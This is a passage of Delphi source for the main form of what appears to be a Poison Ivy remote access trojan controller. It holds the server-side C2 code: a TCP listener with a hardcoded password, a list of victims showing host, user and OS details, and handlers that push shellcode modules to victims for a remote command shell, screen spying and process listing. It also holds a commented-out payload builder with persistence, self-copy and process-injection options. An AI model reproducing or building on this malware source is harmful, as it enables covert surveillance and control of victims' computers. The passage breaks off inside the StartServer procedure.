unit FormMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  CoolTrayIcon, Vcl.Menus, Vcl.StdCtrls, Vcl.Buttons, Vcl.ComCtrls, Vcl.Tabs,
  Vcl.ExtCtrls, Vcl.Samples.Spin, System.ImageList, Vcl.ImgList,
  diocp_tcp_server, UnitGlobal, Vcl.ActnMan, Vcl.ActnColorMaps, Vcl.XPMan,
  Vcl.Imaging.jpeg, Winapi.ShellAPI;

type
  TMainForm = class(TForm)
    PopMenu_Tray: TPopupMenu;
    MenuItem_Show1: TMenuItem;
    MenuItem_EnableBalloontip1: TMenuItem;
    N2: TMenuItem;
    MenuItem_ExitPoisonIvy1: TMenuItem;
    CoolTrayIcon1: TCoolTrayIcon;
    StatusBar_1: TStatusBar;
    TabSet_1: TTabSet;
    SpeedButton_Version: TSpeedButton;
    PageControl_Main: TPageControl;
    ListView_Connections: TListView;
    TabSheet_Connections: TTabSheet;
    TabSheet_Build: TTabSheet;
    Panel_Main: TPanel;
    TabSheet_Setting: TTabSheet;
    TabSheet_Stats: TTabSheet;
    TabSheet_About: TTabSheet;
    GroupBox_Setting: TGroupBox;
    Panel_1: TPanel;
    SpeedButton_Save: TSpeedButton;
    ScrollBox_Setting: TScrollBox;
    Label_1: TLabel;
    Bevel_1: TBevel;
    Label_5: TLabel;
    SpinEdit_Port: TSpinEdit;
    Label_6: TLabel;
    Edit_Password: TEdit;
    CheckBox_Password: TCheckBox;
    ImageList_Flags: TImageList;
    ScrollBox_Stats: TScrollBox;
    Panel_11: TPanel;
    Label_TotalAttempts: TLabel;
    Label_TotalConnections: TLabel;
    GroupBox_1: TGroupBox;
    Label_Sent_Compressed: TLabel;
    Label_Sent_UnCompressed: TLabel;
    Label_Sent_Ratio: TLabel;
    GroupBox_11: TGroupBox;
    Label_Recv_Compressed: TLabel;
    Label_Recv_UnCpmoressed: TLabel;
    Label_Recv_Ratio: TLabel;
    Memo_Stats: TMemo;
    SpeedButton_ResetStats: TSpeedButton;
    GroupBox_Stats: TGroupBox;
    Label_2: TLabel;
    Bevel_2: TBevel;
    RadioButton_Layout_TreeView: TRadioButton;
    RadioButton_Layout_Menu: TRadioButton;
    Label_4: TLabel;
    Bevel_3: TBevel;
    CheckBox_ShowBallontip: TCheckBox;
    Timer_Stats: TTimer;
    PopupMenu_Connections: TPopupMenu;
    ImageList_Thumbnail: TImageList;
    CheckBox_Thumbnail: TCheckBox;
    MenuItem_thumbnail: TMenuItem;
    XPManifest1: TXPManifest;
    GroupBox_About: TGroupBox;
    ScrollBox_About: TScrollBox;
    Label_TitleLabel: TLabel;
    Label_authorlabel: TLabel;
    Image_1: TImage;
    ScrollBox_1: TScrollBox;
    Label_Credits: TLabel;
    Bevel_11: TBevel;
    Label_DankeLabel: TLabel;
    Bevel_12: TBevel;
    Bevel_13: TBevel;
    Label_11: TLabel;
    ScrollBox_11: TScrollBox;
    Label_Development_Team: TLabel;
    Bevel_4: TBevel;
    Label_SloganLabel: TLabel;
    Label_SoftInfo: TLabel;
    Label_3: TLabel;
    Label_12: TLabel;
    Label_13: TLabel;
    GroupBox_Build: TGroupBox;
    ScrollBox_Build: TScrollBox;
    Label_14: TLabel;
    Label_7: TLabel;
    Edit_DnsList: TEdit;
    SpeedButton_Add: TSpeedButton;
    Label_8: TLabel;
    Edit_ID: TEdit;
    Label_9: TLabel;
    Edit_BPassword: TEdit;
    CheckBox_1: TCheckBox;
    CheckBox_Socks5: TCheckBox;
    Bevel_5: TBevel;
    Label_10: TLabel;
    Edit_Socks5_Server: TEdit;
    Label_15: TLabel;
    SpinEdit_Socks5_Port: TSpinEdit;
    Label_16: TLabel;
    Label_17: TLabel;
    Edit_Socks5_Username: TEdit;
    Edit_Socks5_Password: TEdit;
    CheckBox_Startup: TCheckBox;
    Bevel_6: TBevel;
    Edit_StartupName: TEdit;
    Label_18: TLabel;
    SpeedButton_1: TSpeedButton;
    Label_19: TLabel;
    CheckBox_CopySelf: TCheckBox;
    Label_20: TLabel;
    Edit_FileName: TEdit;
    Label_21: TLabel;
    Bevel_8: TBevel;
    Label_22: TLabel;
    Edit_Mutex: TEdit;
    SpeedButton_2: TSpeedButton;
    CheckBox_Inject: TCheckBox;
    SpeedButton_3: TSpeedButton;
    RadioButton_InjectIE: TRadioButton;
    RadioButton_InjectCustom: TRadioButton;
    Bevel_9: TBevel;
    Panel_2: TPanel;
    RadioButton_SystemFolder: TRadioButton;
    RadioButton_WindowsFolder: TRadioButton;
    Label_23: TLabel;
    Edit_InjectProcess: TEdit;
    SpeedButton_4: TSpeedButton;
    dlgSave1: TSaveDialog;
    Panel_3: TPanel;
    RadioButton_Binary: TRadioButton;
    RadioButton_CArray: TRadioButton;
    RadioButton_DelphiArray: TRadioButton;
    Panel_4: TPanel;
    RadioButton_PE: TRadioButton;
    Label_24: TLabel;
    SpinEdit_FileAlign: TSpinEdit;
    RadioButton_ShellCode: TRadioButton;
    Label_25: TLabel;
    RadioButton_PythonArray: TRadioButton;
    Bevel_7: TBevel;
    Bevel_10: TBevel;
    Bevel_14: TBevel;
    Panel_5: TPanel;
    RadioButton_CurrentRun: TRadioButton;
    RadioButton_ActiveX: TRadioButton;
    MenuItem_PING: TMenuItem;
    CheckBox_2: TCheckBox;
    MenuItem_GroupView1: TMenuItem;
    procedure MenuItem_EnableBalloontip1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormResize(Sender: TObject);
    procedure SpeedButton_VersionClick(Sender: TObject);
    procedure TabSet_1Change(Sender: TObject; NewTab: Integer; var AllowChange: Boolean);
    procedure FormMouseWheel(Sender: TObject; Shift: TShiftState; WheelDelta: Integer; MousePos: TPoint; var Handled: Boolean);
    procedure CheckBox_PasswordClick(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure SpeedButton_SaveClick(Sender: TObject);
    procedure SpeedButton_ResetStatsClick(Sender: TObject);
    procedure Timer_StatsTimer(Sender: TObject);
    procedure MenuItem_thumbnailClick(Sender: TObject);
    procedure MenuItem_Show1Click(Sender: TObject);
    procedure MenuItem_ExitPoisonIvy1Click(Sender: TObject);
    procedure CoolTrayIcon1Click(Sender: TObject);
    procedure CoolTrayIcon1DblClick(Sender: TObject);
    procedure Label_12MouseEnter(Sender: TObject);
    procedure Label_12MouseLeave(Sender: TObject);
    procedure Label_13Click(Sender: TObject);
    procedure CheckBox_1Click(Sender: TObject);
    procedure CheckBox_Socks5Click(Sender: TObject);
    procedure SpeedButton_1Click(Sender: TObject);
    procedure SpeedButton_2Click(Sender: TObject);
    procedure SpeedButton_3Click(Sender: TObject);
    procedure SpeedButton_AddClick(Sender: TObject);
    procedure SpeedButton_4Click(Sender: TObject);
    procedure RadioButton_CurrentRunClick(Sender: TObject);
    procedure RadioButton_ActiveXClick(Sender: TObject);
    procedure CheckBox_StartupClick(Sender: TObject);
    procedure ListView_ConnectionsDblClick(Sender: TObject);
    procedure MenuItem_PINGClick(Sender: TObject);
    procedure CheckBox_InjectClick(Sender: TObject);
    procedure CheckBox_CopySelfClick(Sender: TObject);
    procedure CheckBox_2Click(Sender: TObject);
    procedure MenuItem_GroupView1Click(Sender: TObject);
  private
    { Private declarations }
    FTcpServer: TDiocpTcpServer;
  private
    procedure OnConnected(var msg: TMessage); message WM_CONNECTED;
    procedure OnDisConnected(var msg: TMessage); message WM_DISCONNECTED;
    procedure OnClientMessage(var msg: TMessage); message WM_CLIENT_MESSAGE;
    procedure OnAddStats(var msg: TMessage); message WM_ADD_STATS;
  public
    { Public declarations }
    procedure StartServer();
    procedure UpdateStatusBarAndHint();
    procedure SwitchBalloonHintState(b: Boolean);
    procedure SwitchThumbnailState(b: Boolean);
    procedure ResetStats();
    procedure UpdateStats();
    procedure ShowBalloonHint(id, addr, os: string);
    procedure ErrorBox(s: string);
    procedure InfoBox(s: string);
    function FindGroupId(name: string): Integer;
  end;

var
  MainForm: TMainForm;

implementation

uses
  UnitClientContext, SimpleMsgPack, UnitShellCodes, UnitCountryInfo, UnitCommon,
  UnitFormDns, UnitBuilder, FormOperate;

{$R *.dfm}

procedure TMainForm.CheckBox_1Click(Sender: TObject);
begin
  if CheckBox_1.Checked then
    Edit_BPassword.PasswordChar := '*'
  else
    Edit_BPassword.PasswordChar := #00;
end;

procedure TMainForm.CheckBox_2Click(Sender: TObject);
begin
  if CheckBox_2.Checked then
    Edit_Socks5_Password.PasswordChar := '*'
  else
    Edit_Socks5_Password.PasswordChar := #00;
end;

procedure TMainForm.CheckBox_CopySelfClick(Sender: TObject);
begin
  if CheckBox_CopySelf.Checked then
  begin
    RadioButton_SystemFolder.Enabled := True;
    RadioButton_WindowsFolder.Enabled := True;
    Edit_FileName.Enabled := True;
    Edit_FileName.Color := clWindow;
  end else
  begin
    RadioButton_SystemFolder.Enabled := False;
    RadioButton_WindowsFolder.Enabled := False;
    Edit_FileName.Enabled := False;
    Edit_FileName.Color := clScrollBar;
  end;
end;

procedure TMainForm.CheckBox_InjectClick(Sender: TObject);
begin
  if CheckBox_Inject.Checked then
  begin
    RadioButton_InjectIE.Enabled := True;
    RadioButton_InjectCustom.Enabled := True;
    Edit_InjectProcess.Enabled := True;
    Edit_InjectProcess.Color := clWindow;
  end else
  begin
    RadioButton_InjectIE.Enabled := False;
    RadioButton_InjectCustom.Enabled := False;
    Edit_InjectProcess.Enabled := False;
    Edit_InjectProcess.Color := clScrollBar;
  end;
end;

procedure TMainForm.CheckBox_PasswordClick(Sender: TObject);
begin
  if CheckBox_Password.Checked then
  begin
    Edit_Password.PasswordChar := '*';
  end
  else
  begin
    Edit_Password.PasswordChar := #0;
  end;
end;

procedure TMainForm.CheckBox_Socks5Click(Sender: TObject);
begin
  if CheckBox_Socks5.Checked then
  begin
    Edit_Socks5_Server.Color := clWindow;
    SpinEdit_Socks5_Port.Color := clWindow;
    Edit_Socks5_Username.Color := clWindow;
    Edit_Socks5_Password.Color := clWindow;

    Edit_Socks5_Server.Enabled := True;
    SpinEdit_Socks5_Port.Enabled := True;
    Edit_Socks5_Username.Enabled := True;
    Edit_Socks5_Password.Enabled := True;
  end
  else
  begin
    Edit_Socks5_Server.Color := clScrollBar;
    SpinEdit_Socks5_Port.Color := clScrollBar;
    Edit_Socks5_Username.Color := clScrollBar;
    Edit_Socks5_Password.Color := clScrollBar;

    Edit_Socks5_Server.Enabled := False;
    SpinEdit_Socks5_Port.Enabled := False;
    Edit_Socks5_Username.Enabled := False;
    Edit_Socks5_Password.Enabled := False;
  end;
end;

procedure TMainForm.CheckBox_StartupClick(Sender: TObject);
begin
  if CheckBox_Startup.Checked then
  begin
    Edit_StartupName.Enabled := True;
    SpeedButton_1.Enabled := True;
    RadioButton_CurrentRun.Enabled := True;
    RadioButton_ActiveX.Enabled := True;
    Edit_StartupName.Color := clWindow;
  end
  else
  begin
    Edit_StartupName.Enabled := False;
    SpeedButton_1.Enabled := False;
    RadioButton_CurrentRun.Enabled := False;
    RadioButton_ActiveX.Enabled := False;
    Edit_StartupName.Color := clScrollBar;
  end;
end;

procedure TMainForm.MenuItem_EnableBalloontip1Click(Sender: TObject);
begin
  SwitchBalloonHintState(not MenuItem_EnableBalloontip1.Checked);
end;

procedure TMainForm.MenuItem_ExitPoisonIvy1Click(Sender: TObject);
begin
  Self.Close;
end;

procedure TMainForm.MenuItem_GroupView1Click(Sender: TObject);
begin
  ListView_Connections.GroupView := not ListView_Connections.GroupView;
  MenuItem_GroupView1.Checked := ListView_Connections.GroupView;
end;

procedure TMainForm.MenuItem_PINGClick(Sender: TObject);
begin
  if ListView_Connections.Selected = nil then
    Exit;

  TClientContext(ListView_Connections.Selected.Data).SendPing;
end;

procedure TMainForm.MenuItem_Show1Click(Sender: TObject);
begin
  if Self.Visible then
    Self.Visible := False
  else
    Self.Visible := True;
end;

procedure TMainForm.CoolTrayIcon1Click(Sender: TObject);
begin
  MenuItem_Show1Click(Sender);
end;

procedure TMainForm.CoolTrayIcon1DblClick(Sender: TObject);
begin
  MenuItem_Show1Click(Sender);
end;

procedure TMainForm.ErrorBox(s: string);
begin
  MessageBox(Handle, PChar(s), 'Error', MB_ICONERROR or MB_OK);
end;

function TMainForm.FindGroupId(name: string): Integer;
var
  i: Integer;
begin
  for i := 0 to ListView_Connections.Groups.Count - 1 do
  begin
    with ListView_Connections.Groups.Items[i] do
    begin
      if (Header = name) then
      begin
        Result := GroupID;
        Exit;
      end;
    end;
  end;

  with ListView_Connections.Groups.Add do
  begin
    Header := name;
    HeaderAlign := TAlignment.taCenter;
    Result := GroupID;
  end;
end;

procedure TMainForm.FormCreate(Sender: TObject);
var
  i: Integer;
  sl: TStringList;
begin
  Self.Height := 400;
  Self.Width := 800;
  sl := TStringList.Create;
  try
    sl.Append('Aphex');
    sl.Append('shapeless');
    sl.Append('Anskya');
    sl.Append('ymofen');
    Label_Credits.Caption := sl.Text;
    sl.Clear;
    sl.Append('Anskya');
    Label_Development_Team.Caption := sl.Text;
  finally
    FreeAndNil(sl);
  end;
  // 设置全局变量
  g_ListeningPort := 8080;
  g_Password := 'killeven';
  g_TreeVeiwLayout := True;
  g_ShowThumbnail := False;
  SwitchBalloonHintState(True);

  // 设置选项卡位置
  TabSet_1.Parent := StatusBar_1;
  TabSet_1.SetBounds(StatusBar_1.Panels.Items[0].Width + 3, 2, StatusBar_1.Panels.Items[1].Width - 4, StatusBar_1.Height - 5);
  TabSet_1.ParentBackground := True;
  TabSet_1.SoftTop := True;

  // 设置状态栏按钮
  SpeedButton_Version.Parent := StatusBar_1;
  SpeedButton_Version.SetBounds(1, 3, StatusBar_1.Panels.Items[0].Width - 2, StatusBar_1.Height - 4);
  SpeedButton_Version.Flat := True;

  for i := 0 to PageControl_Main.PageCount - 1 do
    PageControl_Main.Pages[i].TabVisible := False;
  PageControl_Main.ActivePage := PageControl_Main.Pages[0];

  FormResize(Self);

  // 设置tcpserver
  FTcpServer := TDiocpTcpServer.Create(Self);
  FTcpServer.WorkerCount := 0;
  FTcpServer.RegisterContextClass(TClientContext);
  FTcpServer.CreateDataMonitor;
  ResetStats;

  StartServer;
end;

procedure TMainForm.FormDestroy(Sender: TObject);
begin
  FTcpServer.SafeStop;
  FreeAndNil(FTcpServer);
end;

procedure TMainForm.FormMouseWheel(Sender: TObject; Shift: TShiftState; WheelDelta: Integer; MousePos: TPoint; var Handled: Boolean);
var
  scroll_bar: TControlScrollBar;
begin
  case PageControl_Main.ActivePageIndex of
    1:
      begin
        scroll_bar := ScrollBox_Build.VertScrollBar;
      end;
    2:
      begin
        scroll_bar := ScrollBox_Setting.VertScrollBar;
      end;
    3:
      begin
        scroll_bar := ScrollBox_Stats.VertScrollBar;
      end;
    4:
      begin
        scroll_bar := ScrollBox_About.VertScrollBar;
      end
  else
    Exit;
  end;

  scroll_bar.Position := scroll_bar.Position - (WheelDelta div 10);
end;

procedure TMainForm.FormResize(Sender: TObject);
begin
  StatusBar_1.Panels.Items[1].Width := MainForm.ClientWidth - (StatusBar_1.Panels.Items[0].Width + 3) - (StatusBar_1.Panels.Items[2].Width + 3) - (StatusBar_1.Panels.Items[3].Width + 3);
  TabSet_1.Width := StatusBar_1.Panels.Items[1].Width - 5;

  if (PageControl_Main.ActivePageIndex = 0) then
  begin
    Panel_Main.Left := -4;
    Panel_Main.Top := -5;
    Panel_Main.Height := MainForm.ClientHeight - StatusBar_1.Height + 10;
    Panel_Main.Width := MainForm.ClientWidth + 8;
  end
  else
  begin
    Panel_Main.Left := 0;
    Panel_Main.Top := -1;
    Panel_Main.Height := MainForm.ClientHeight - StatusBar_1.Height + 0;
    Panel_Main.Width := MainForm.ClientWidth + 0;
  end;
end;

procedure TMainForm.InfoBox(s: string);
begin
  MessageBox(Handle, PChar(s), 'Info', MB_ICONINFORMATION or MB_OK);
end;

procedure TMainForm.Label_12MouseEnter(Sender: TObject);
begin
  (Sender as TLabel).Font.Color := clRed;
end;

procedure TMainForm.Label_12MouseLeave(Sender: TObject);
begin
  (Sender as TLabel).Font.Color := clBlue;
end;

procedure TMainForm.Label_13Click(Sender: TObject);
begin
  ShellExecute(Handle, 'open', PChar((Sender as TLabel).Caption), nil, nil, SW_SHOW);
end;

procedure TMainForm.ListView_ConnectionsDblClick(Sender: TObject);
var
  form: TOperateForm;
  ctx: TClientContext;
  sel: TListItem;
begin
  sel := ListView_Connections.Selected;
  if sel = nil then
    Exit;

  ctx := TClientContext(sel.Data);
  if ctx.OperateForm = nil then
  begin
    form := TOperateForm.Create(Self);
    form.Caption := Format('[%s] %s Poision Ivy Reload', [sel.Caption, ctx.RemoteAddr]);

    form.ctx := ctx;
    ctx.OperateForm := form;
  end
  else
  begin
    form := TOperateForm(ctx.OperateForm);
  end;

  form.Show;
end;

procedure TMainForm.MenuItem_thumbnailClick(Sender: TObject);
begin
  SwitchThumbnailState(not MenuItem_thumbnail.Checked);
end;

procedure TMainForm.OnAddStats(var msg: TMessage);
begin
  Memo_Stats.Lines.Add(string(msg.LParam));
end;

procedure TMainForm.OnClientMessage(var msg: TMessage);
var
  ctx: TClientContext;
  cmsg: TClientMessage;
  msgpack: TSimpleMsgPack;
  li: TListItem;
  temp: DWORD;
  bmp: TBitmap;
  mouse_pt, bmp_pt: TPoint;
begin
  ctx := TClientContext(msg.WParam);
  cmsg := TClientMessage(msg.LParam);
  msgpack := TSimpleMsgPack.Create;
  try
    if (cmsg.cmd <> CMD_SCREENSPY_DATA) and (cmsg.cmd <> CMD_CMDSHELL_DATA) then
    begin
      Memo_Stats.Lines.Add('recv cmd: ' + CmdStrings[uint8(cmsg.cmd)]);
    end;

    case cmsg.cmd of
      CMD_LOGIN_INFO:
        begin
          msgpack.DecodeFromStream(cmsg.buffer);

          ListView_Connections.Items.BeginUpdate;
          li := ListView_Connections.Items.Add;
          with li do
          begin
            GroupID := FindGroupId(msgpack.S['group']);
            Caption := msgpack.S['id'];
            SubItems.Add(ctx.RemoteAddr);
            SubItems.Add(msgpack.S['lan']);
            SubItems.Add(msgpack.S['computer_name']);
            SubItems.Add(msgpack.S['username']);
            SubItems.Add(GetAccType(msgpack.I['acc']));
            SubItems.Add(GetOsVersion(msgpack.S['os']));
            SubItems.Add(IntToStr(msgpack.I['cpu']) + ' Mhz');
            SubItems.Add(SizeToStr(msgpack.I['ram']));
            SubItems.Add(GetVersion(msgpack.I['version']));
            SubItems.Add('-');
          end;
          ctx.SendPing;
          ctx.Image_Index := GetCountryImageIndex(msgpack.S['language']);

          if not g_ShowThumbnail then
            li.ImageIndex := ctx.Image_Index
          else
            ctx.SendCmd(CMD_THUMBANIL_START);

          li.Data := ctx;
          ctx.Data := li;
          ListView_Connections.Items.EndUpdate;

          ShowBalloonHint(msgpack.S['id'], ctx.RemoteAddr, GetOsVersion(msgpack.S['os']));
          UpdateStatusBarAndHint;
        end;
      CMD_PING:
        begin
        // reply pong then update ping
          ctx.SendCmd(CMD_PONG);
          ctx.SendPing();
        end;
      CMD_PONG:
        begin
          cmsg.buffer.Read(temp, SizeOf(temp));
          if ctx.Data <> nil then
          begin
            TListItem(ctx.Data).SubItems[9] := IntToStr(GetTickCount() - temp);
            TListItem(ctx.Data).Update;
          end;
        end;
      CMD_THUMBNAIL_DATA:
        begin
          if g_ShowThumbnail and (ctx.Data <> nil) then
          begin
            bmp := TBitmap.Create;
            try
              bmp := TBitmap.Create;
              bmp.LoadFromStream(cmsg.buffer);

              if (ctx.Thumbnail_Index = -1) then
                ctx.Thumbnail_Index := ImageList_Thumbnail.Add(bmp, nil)
              else
                ImageList_Thumbnail.Replace(ctx.Thumbnail_Index, bmp, nil);

              TListItem(ctx.Data).ImageIndex := ctx.Thumbnail_Index;
              TListItem(ctx.Data).Update;
            finally
              FreeAndNil(bmp);
            end;
          end;
        end;
      CMD_SCREENSPY_START:
        begin
          TOperateForm(ctx.OperateForm).SetScreenSpyState(True);
        end;
      CMD_SCREENSPY_DATA:
        begin
          cmsg.buffer.Read(mouse_pt, SizeOf(mouse_pt));
          bmp := TBitmap.Create;
          try
            while (cmsg.buffer.Read(bmp_pt, SizeOf(bmp_pt)) <> 0) do
            begin
              bmp.LoadFromStream(cmsg.buffer);
              TOperateForm(ctx.OperateForm).ScreenSpyDraw(mouse_pt, bmp_pt, bmp);
            end;
          finally
            FreeAndNil(bmp);
          end;
        end;
      CMD_SCREENSPY_END:
        begin
          TOperateForm(ctx.OperateForm).SetScreenSpyState(False);
        end;
      CMD_PROCESS_LIST:
        begin
          with TOperateForm(ctx.OperateForm) do
          begin
            ClearProcesses;
            while (cmsg.buffer.Position <> cmsg.buffer.Size) do
            begin
              msgpack.DecodeFromStream(cmsg.buffer);
              AddProcessesItem(msgpack.Items[0].AsString, msgpack.Items[1].AsString);
            end;
          end;
        end;
      CMD_CMDSHELL_START:
        begin
          TOperateForm(ctx.OperateForm).SetCmdShellState(True);
        end;
      CMD_CMDSHELL_DATA:
        begin
          msgpack.DecodeFromStream(cmsg.buffer);
          TOperateForm(ctx.OperateForm).AddToCmdShell(PAnsiChar(msgpack.AsBytes));
        end;
      CMD_CMDSHELL_END:
        begin
          TOperateForm(ctx.OperateForm).SetCmdShellState(False);
        end;
      CMD_SHELLCODE_MAIN:
        begin
          Memo_Stats.Lines.Add(Format('send shellcode main, size = 0x%x.', [get_information_size()]));
          ctx.SendCmd(CMD_SHELLCODE_MAIN, get_main_ptr(), get_main_size());
        end;
      CMD_SHELLCODE_INFORMATION:
        begin
          Memo_Stats.Lines.Add(Format('send shellcode information, size = 0x%x.', [get_information_size()]));
          ctx.SendCmd(CMD_SHELLCODE_INFORMATION, get_information_ptr(), get_information_size());
        end;
      CMD_SHELLCODE_CMD_SHELL:
        begin
          Memo_Stats.Lines.Add(Format('send shellcode cmd_shell, size = 0x%x.', [get_cmd_shell_size()]));
          ctx.SendCmd(CMD_SHELLCODE_CMD_SHELL, get_cmd_shell_ptr(), get_cmd_shell_size());
        end;
      CMD_SHELLCODE_THUMBNAIL:
        begin
          Memo_Stats.Lines.Add(Format('send shellcode thumbnail, size = 0x%x.', [get_thumbnail_size()]));
          ctx.SendCmd(CMD_SHELLCODE_THUMBNAIL, get_thumbnail_ptr(), get_thumbnail_size());
        end;
      CMD_SHELLCODE_SCREENSPY:
        begin
          Memo_Stats.Lines.Add(Format('send shellcode screenspy, size = 0x%x.', [get_screenspy_size()]));
          ctx.SendCmd(CMD_SHELLCODE_SCREENSPY, get_screenspy_ptr(), get_screenspy_size());
        end;
      CMD_SHELLCODE_PROCESS:
        begin
          Memo_Stats.Lines.Add(Format('send shellcode process, size = 0x%x.', [get_process_size()]));
          ctx.SendCmd(CMD_SHELLCODE_PROCESS, get_process_ptr(), get_process_size());
        end;
    else
      begin
        Memo_Stats.Lines.Add('unknow proto');
      end;
    end;
  except
    on e: Exception do
    begin
      Memo_Stats.Lines.Add('exception' + e.Message);
    end;
  end;

  FreeAndNil(msgpack);
end;

procedure TMainForm.OnConnected(var msg: TMessage);
var
  ctx: TClientContext;
begin
  ctx := TClientContext(msg.WParam);
  Memo_Stats.Lines.Add('connected: ' + ctx.RemoteAddr + ':' + IntToStr(ctx.RemotePort));
end;

procedure TMainForm.OnDisConnected(var msg: TMessage);
var
  ctx: TClientContext;
  form: TOperateForm;
begin
  ctx := TClientContext(msg.WParam);
  Memo_Stats.Lines.Add('disconnected: ' + ctx.RemoteAddr + ':' + IntToStr(ctx.RemotePort));
  if (ctx.Data <> nil) then
  begin
    ListView_Connections.Items.Delete(TListItem(ctx.Data).Index);
  end;

  form := TOperateForm(ctx.OperateForm);
  if (form <> nil) then
  begin
    form.Close;
    FreeAndNil(form);
  end;

  UpdateStatusBarAndHint;
end;

procedure TMainForm.RadioButton_ActiveXClick(Sender: TObject);
begin
  SpeedButton_1.Visible := RadioButton_ActiveX.Checked;
end;

procedure TMainForm.RadioButton_CurrentRunClick(Sender: TObject);
begin
  SpeedButton_1.Visible := RadioButton_ActiveX.Checked;

  if CheckBox_Startup.Checked then
  begin
    Edit_StartupName.Enabled := True;
    SpeedButton_1.Enabled := True;

    Edit_StartupName.Color := clWindow;
  end;
end;

procedure TMainForm.ResetStats;
begin
  g_TotalConnections := 0;
  g_TotalAttempts := 0;
  g_Sent_UnCompressed := 0;
  g_Recv_UnCompressed := 0;
  Memo_Stats.Lines.Clear;
  FTcpServer.DataMoniter.Clear;
  UpdateStats;
end;

procedure TMainForm.ShowBalloonHint(id, addr, os: string);
var
  sl: TStringList;
begin
  if g_ShowBalloonHint then
  begin
    sl := TStringList.Create;
    try
      sl.Append(Format('%s connected from %s!', [id, addr]));
      sl.Append(os);
      CoolTrayIcon1.ShowBalloonHint('New Connection!', sl.Text, bitInfo, 10);
    finally
      FreeAndNil(sl);
    end;
  end;
end;

procedure TMainForm.SpeedButton_1Click(Sender: TObject);
var
  guid: TGUID;
begin
  CreateGUID(guid);
  Edit_StartupName.Text := GUIDToString(guid);
end;

procedure TMainForm.SpeedButton_2Click(Sender: TObject);
begin
  InfoBox('Only change these values if you know what they do!');
end;

procedure TMainForm.SpeedButton_3Click(Sender: TObject);
begin
  InfoBox('The server will try to inject into this process 4 times');
end;

procedure TMainForm.SpeedButton_4Click(Sender: TObject);
//var
  //builder: TBuilder;
begin
//  if Edit_DnsList.Text = '' then
//  begin
//    ErrorBox('DNSList is empty');
//    Exit;
//  end;
//
//  if Edit_ID.Text = '' then
//  begin
//    ErrorBox('Must Input ID');
//    Exit;
//  end;
//
//  if Edit_Password.Text = '' then
//  begin
//    ErrorBox('Must Input password');
//    Exit;
//  end;
//
//  if CheckBox_Socks5.Checked then
//  begin
//    if Edit_Socks5_Server.Text = '' then
//    begin
//      ErrorBox('Must Input socks DNS');
//      Exit;
//    end;
//  end;
//
//  if CheckBox_Startup.Checked then
//  begin
//    if Edit_StartupName.Text = '' then
//    begin
//      ErrorBox('Must Input startup name');
//      Exit;
//    end;
//  end;
//
//  if CheckBox_CopySelf.Checked then
//  begin
//    if Edit_FileName.Text = '' then
//    begin
//      ErrorBox('Must Input copy to filename');
//      Exit;
//    end;
//  end;
//
//  if Edit_Mutex.Text = '' then
//  begin
//    ErrorBox('Must Input mutex name');
//    Exit;
//  end;
//
//  if CheckBox_Inject.Checked then
//  begin
//    if RadioButton_InjectCustom.Checked then
//    begin
//      if Edit_InjectProcess.Text = '' then
//      begin
//        ErrorBox('Must input custom process name');
//        Exit;
//      end;
//    end;
//  end;
//
//
//  builder := TBuilder.Create;
//  try
//    builder.WriteDNSList(Edit_DnsList.Text);
//    builder.WriteID(Edit_ID.Text);
//    builder.WritePassword(Edit_Password.Text);
//    if CheckBox_Socks5.Checked then
//    begin
//      builder.WriteSocks5(Edit_Socks5_Server.Text, Edit_Socks5_Username.Text, Edit_Socks5_Password.Text, SpinEdit_Socks5_Port.Value);
//    end;
//
//    if CheckBox_Startup.Checked then
//    begin
//      builder.WriteStartUp(RadioButton_ActiveX.Checked, Edit_StartupName.Text);
//    end;
//
//    if CheckBox_CopySelf.Checked then
//    begin
//      builder.WriteInstallation(RadioButton_SystemFolder.Checked, Edit_FileName.Text);
//    end;
//
//    builder.WriteMutex(Edit_Mutex.Text);
//
//    if CheckBox_Inject.Checked then
//    begin
//      builder.WriteInject(RadioButton_InjectIE.Checked, Edit_InjectProcess.Text);
//    end;
//
//    builder.WriteConfigEnd;
//
//    if RadioButton_Binary.Checked then
//    begin
//      dlgSave1.DefaultExt := '.bin';
//      dlgSave1.Filter := 'binary file(*.bin)|*.bin;';
//      if dlgSave1.Execute(Handle) then
//        builder.SaveToBinary(dlgSave1.FileName);
//    end
//    else if RadioButton_CArray.Checked then
//    begin
//      dlgSave1.DefaultExt := '.c';
//      dlgSave1.Filter := 'c file(*.c)|*.c;';
//      if dlgSave1.Execute(Handle) then
//        builder.SaveToCArray(dlgSave1.FileName);
//    end
//    else if RadioButton_DelphiArray.Checked then
//    begin
//      dlgSave1.DefaultExt := '.inc';
//      dlgSave1.Filter := 'delphi file(*.inc)|*.inc;';
//      if dlgSave1.Execute(Handle) then
//        builder.SaveToCArray(dlgSave1.FileName);
//    end
//    else if RadioButton_PythonArray.Checked then
//    begin
//      dlgSave1.DefaultExt := '.py';
//      dlgSave1.Filter := 'python file(*.py)|*.py;';
//      if dlgSave1.Execute(Handle) then
//        builder.SaveToCArray(dlgSave1.FileName);
//    end;
//  finally
//    FreeAndNil(builder);
//  end;
end;

procedure TMainForm.SpeedButton_AddClick(Sender: TObject);
begin
  DnsForm.LoadFromString(Edit_DnsList.Text);
  if DnsForm.ModalResult = mrOk then
  begin
    Edit_DnsList.Text := DnsForm.DNSList();
  end;
end;

procedure TMainForm.SpeedButton_ResetStatsClick(Sender: TObject);
begin
  ResetStats;
end;

procedure TMainForm.SpeedButton_SaveClick(Sender: TObject);
begin
  if SpinEdit_Port.Value <> g_ListeningPort then
  begin
    g_ListeningPort := SpinEdit_Port.Value;
    StartServer;
  end;

  SwitchBalloonHintState(CheckBox_ShowBallontip.Checked);
  SwitchThumbnailState(CheckBox_Thumbnail.Checked);
  UpdateStatusBarAndHint;
end;

procedure TMainForm.SpeedButton_VersionClick(Sender: TObject);
var
  sl: TStringList;
begin
  sl := TStringList.Create;
  try
    sl.Add('This Client version(0.0.1) is compatible with then');
    sl.Add('following Server versions');
    sl.Add('0.0.1');
    InfoBox(sl.Text);
  finally
    FreeAndNil(sl);
  end;
end;

procedure TMainForm.StartServer;
begin
  try
    if FTcpServer.Active then
      FTcpServer.SafeStop;
    FTcpServer.Port := g_ListeningPort;
    FTcpServer.Open;
    UpdateStatusBarAndHint;
  except
    on e: Exception do
    begin
      g_ListeningPort := 0;
      UpdateStatusBarAndHint;
      ErrorBox('Startup error');
